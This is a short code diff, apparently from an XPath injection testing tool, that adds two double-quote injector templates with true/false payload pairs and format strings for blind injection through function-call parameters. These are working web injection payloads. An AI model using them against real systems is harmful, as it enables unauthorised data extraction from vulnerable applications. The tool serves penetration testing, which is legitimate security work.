@@ -69,7 +69,22 @@ injectors = [
                   ("{working}') and true() and string('1'='1", True),
                   ("{working}') and false() and string('1'='1", False),
               ),
-              makeformat("{working}') and {expression} and string('1'='1"))
+              makeformat("{working}') and {expression} and string('1'='1")),
+    Injection('function call - last string parameter - double quote',
+              "/lib/something[function(?)]",
+              (
+                  ('{working}") and true() and string("1"="1', True),
+                  ('{working}") and false() and string("1"="1', False),
+              ),
+              makeformat('{working}") and {expression} and string("1"="1')),
+    Injection('other elements - last string parameter - double quote',
+              "/lib/something[function(?) and false()] | //*[?]",
+              (
+                  ('{working}") and false()] | //*[true() and string("1"="1', True),
+                  ('{working}") and false()] | //*[false() and string("1"="1', False),
+              ),
+              makeformat('{working}") and false()] | //*[{expression} and string("1"="1'))
+
 ]
 
 
